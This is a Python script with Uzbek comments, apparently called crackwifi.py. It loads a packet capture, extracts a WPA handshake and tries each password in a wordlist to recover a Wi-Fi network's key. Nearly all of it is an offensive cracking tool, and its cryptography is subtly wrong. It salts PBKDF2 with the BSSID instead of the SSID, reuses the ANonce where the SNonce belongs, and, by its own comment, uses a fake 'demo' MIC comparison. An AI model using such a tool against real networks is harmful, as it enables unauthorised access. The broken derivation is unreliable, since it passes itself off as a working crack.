import os
import sys
import hashlib
import hmac
from binascii import a2b_hex, b2a_hex
from scapy.all import rdpcap, Dot11EAPOL
from hashlib import pbkdf2_hmac

def get_handshake_packets(packets, bssid):
    """Handshake paketlarini olish"""
    handshake = []
    for pkt in packets:
        if pkt.haslayer(Dot11EAPOL):
            if pkt.addr2.lower() == bssid.lower() or pkt.addr3.lower() == bssid.lower():
                handshake.append(pkt)
    return handshake

def custom_pmk_to_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    """PMK dan PTK ni hisoblash"""
    # PTK uchun material
    A = b"Pairwise key expansion"
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    
    ptk = b""
    for i in range(4):
        # HMAC-SHA1 orqali hisoblash
        hmacsha1 = hmac.new(pmk, A + chr(0).encode() + B + chr(i).encode(), hashlib.sha1)
        ptk += hmacsha1.digest()
    
    return ptk[:80]  # 512 bit (64 bayt) PTK + 256 bit (32 bayt) MIC

def crack_wifi(cap_file, wordlist):
    """Asosiy parol sinash funksiyasi"""
    try:
        print(f"[*] WiFi parol sinash boshlandi...")
        print(f"[*] CAP fayl: {cap_file}")
        print(f"[*] Parol fayli: {wordlist}")
        
        # CAP faylni o'qish
        packets = rdpcap(cap_file)
        
        # BSSID ni aniqlash
        bssid = None
        for pkt in packets:
            if pkt.haslayer('Dot11Beacon'):
                bssid = pkt.addr2.lower()
                break
        
        if not bssid:
            print("[-] BSSID topilmadi!")
            return False
        
        print(f"[+] BSSID topildi: {bssid}")
        
        # Handshake paketlarini olish
        handshake_packets = get_handshake_packets(packets, bssid)
        if not handshake_packets:
            print("[-] Handshake topilmadi!")
            return False
        
        print(f"[+] {len(handshake_packets)} ta handshake paketi topildi")
        
        # Eng muhim handshake paketini tanlash
        first_packet = handshake_packets[0]
        anonce = first_packet.load()[17:49]  # ANonce olish
        ap_mac = a2b_hex(first_packet.addr2.replace(':', ''))
        client_mac = a2b_hex(first_packet.addr1.replace(':', ''))
        
        # MIC ni olish (4-baytdan keyin)
        mic = first_packet.load()[81:97]
        
        # Parol faylini o'qish
        with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
            total_passwords = sum(1 for _ in f)
            f.seek(0)
            
            for i, password in enumerate(f, 1):
                password = password.strip()
                if not password:
                    continue
                
                # Progress ko'rsatish
                if i % 100 == 0:
                    print(f"[*] Progress: {i}/{total_passwords} ({i/total_passwords*100:.1f}%) - Sinab ko'rilmoqda: {password[:20]}...")
                
                try:
                    # PMK ni hisoblash
                    pmk = pbkdf2_hmac(
                        'sha1',
                        password.encode('utf-8', 'ignore'),
                        bssid.encode('utf-8'),
                        4096,
                        32
                    )
                    
                    # PTK ni hisoblash
                    ptk = custom_pmk_to_ptk(pmk, anonce, anonce, ap_mac, client_mac)
                    
                    # MIC ni tekshirish (soddalashtirilgan)
                    # Haqiqiy loyihada bu qism ancha murakkab bo'lishi kerak
                    calculated_mic = ptk[32:48]  # Demo uchun
                    
                    if calculated_mic == mic:
                        print(f"[+] PAROL TOPILDI: {password}")
                        return True
                
                except Exception as e:
                    print(f"[-] Xato '{password}': {str(e)}")
                    continue
        
        print("[-] Parol topilmadi!")
        return False
    
    except Exception as e:
        print(f"[-] Xato yuz berdi: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Foydalanish: python crackwifi.py <cap_file> <wordlist>")
        sys.exit(1)
    
    cap_file = sys.argv[1]
    wordlist = sys.argv[2]
    
    if not os.path.isfile(cap_file):
        print(f"[-] CAP fayl topilmadi: {cap_file}")
        sys.exit(1)
    
    if not os.path.isfile(wordlist):
        print(f"[-] Parol fayli topilmadi: {wordlist}")
        sys.exit(1)
    
    result = crack_wifi(cap_file, wordlist)
    
    if not result:
        print("[-] Parol topilmadi! Boshqa parol faylidan foydalanishga harakat qiling")